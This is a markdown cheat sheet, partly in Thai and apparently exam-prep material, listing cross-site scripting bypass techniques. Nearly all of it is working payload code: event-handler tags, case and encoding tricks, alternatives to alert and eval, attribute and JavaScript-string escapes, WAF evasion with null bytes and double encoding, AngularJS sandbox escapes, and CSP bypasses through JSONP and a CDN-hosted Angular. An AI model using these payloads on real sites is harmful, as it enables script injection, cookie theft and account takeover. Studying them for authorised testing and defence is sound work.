# Bypass Techniques
> [Back to Index](README.md)

---

## Encoding Techniques

### URL Encoding

| Character | Encoded |
|-----------|---------|
| `<` | `%3C` |
| `>` | `%3E` |
| `"` | `%22` |
| `'` | `%27` |
| `/` | `%2F` |
| `+` | `%2B` |
| `=` | `%3D` |
| space | `%20` or `+` |

### Double URL Encoding

```
< → %3C → %253C
```

### HTML Entity Encoding

```html
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
```

---

## Tag Bypass

### ถ้า `<script>` ถูก block

```html
<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### Custom Tags

```html
<xss onclick=alert(1)>click me
<custom-tag onfocus=alert(1) tabindex=1>focus me
```

---

## Function Bypass

### ถ้า `alert` ถูก block

```javascript
// Alternatives
prompt(1)
confirm(1)
print()
console.log(1)

// Constructor
[].constructor.constructor('alert(1)')()

// eval alternatives
Function('alert(1)')()
setTimeout('alert(1)')
setInterval('alert(1)')
```

### String construction

```javascript
// Concatenation
'al'+'ert'
['al','ert'].join('')

// fromCharCode
String.fromCharCode(97,108,101,114,116)  // "alert"
```

---

## Attribute Escape

### ถ้าอยู่ใน attribute

```html
<!-- Original -->
<input value="USER_INPUT">

<!-- Escape with " -->
" onmouseover="alert(1)

<!-- Escape with ' -->
' onclick='alert(1)

<!-- Without quotes -->
onmouseover=alert(1)

<!-- Event without interaction -->
" onfocus="alert(1)" autofocus="
```

---

## JavaScript String Escape

### ถ้าอยู่ใน JS string

```javascript
// Original
var x = 'USER_INPUT';

// Escape with '
'; alert(1);//

// Close script and open new
</script><script>alert(1)</script>

// Template literal
`; alert(1);//
```

---

## Filter Bypass Techniques

### Space alternatives

```html
<svg/onload=alert(1)>
<svg	onload=alert(1)>  <!-- tab -->
<svg
onload=alert(1)>  <!-- newline -->
```

### Parentheses bypass

```javascript
// Using template literals
alert`1`
alert`document.cookie`

// Using throw
throw onerror=alert,1
```

### Quote bypass

```javascript
// Without quotes
<img src=x onerror=alert(1)>

// Backticks
alert`1`

// fromCharCode
alert(String.fromCharCode(49))
```

---

## WAF Bypass

### Common techniques

```html
<!-- Case mixing -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Null bytes -->
<scr%00ipt>alert(1)</script>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
<script>alert(1)</script>  <!-- full-width < > -->

<!-- HTML entities in JS -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

---

## AngularJS Sandbox Escape

### Version 1.6+

```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

### With toString

```javascript
{{toString().constructor.prototype.charAt=[].join;$eval('x]alert(1)//')}}
```

---

## CSP Bypass

### ถ้ามี CSP

1. **หา allowed domains** ที่มี JSONP หรือ Angular
2. **ใช้ base-uri** ถ้าไม่ได้ restrict
3. **ใช้ nonce/hash** ที่ leak มา

```html
<!-- JSONP bypass -->
<script src="https://allowed-domain.com/jsonp?callback=alert"></script>

<!-- Angular on allowed CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
```

---

## Quick Bypass Checklist

```
┌────────────────────────────────────────────────────────┐
│                  BYPASS CHECKLIST                       │
├────────────────────────────────────────────────────────┤
│                                                        │
│  1. <script> blocked?                                  │
│     → ใช้ event handlers: onerror, onload, onfocus    │
│                                                        │
│  2. alert() blocked?                                   │
│     → ใช้ prompt(), confirm(), print()                │
│                                                        │
│  3. Quotes blocked?                                    │
│     → ใช้ backticks หรือ no quotes                    │
│                                                        │
│  4. Spaces blocked?                                    │
│     → ใช้ / หรือ tab หรือ newline                     │
│                                                        │
│  5. All tags blocked?                                  │
│     → ใช้ custom tags หรือ AngularJS {{ }}            │
│                                                        │
│  6. CSP enabled?                                       │
│     → หา JSONP, Angular CDN, nonce leak               │
│                                                        │
└────────────────────────────────────────────────────────┘
```

---

> **Next:** [05-Exam-Workflow.md](05-Exam-Workflow.md)
